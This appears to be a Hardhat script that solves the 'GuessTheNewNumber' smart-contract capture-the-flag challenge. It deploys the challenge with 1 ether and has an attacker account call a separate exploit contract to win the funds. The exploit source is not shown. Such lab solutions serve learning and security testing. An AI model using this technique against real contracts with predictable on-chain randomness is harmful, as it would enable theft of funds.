async function main() {
    [owner,attacker] = await ethers.getSigners();
    Challenge = await ethers.getContractFactory('GuessTheNewNumberChallenge', owner);
    // challenge = await Challenge.attach('0xCDb22233f0e0bCD179f69436ce523042D06F16c0');
    challenge = await Challenge.deploy({value:ethers.utils.parseEther('1')});
    await challenge.deployed();

    Exploit = await ethers.getContractFactory('GuessTheNewNumberExploit', attacker);
    exploit = await Exploit.deploy();
    await exploit.deployed();
    tx = await exploit.exploit(challenge.address, {value: ethers.utils.parseEther('1')});
    await tx.wait();
    // tx = await exploit.withdraw();
    // await tx.wait();
    console.log('Challenge completed:', await challenge.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error);
      process.exit(1);
  })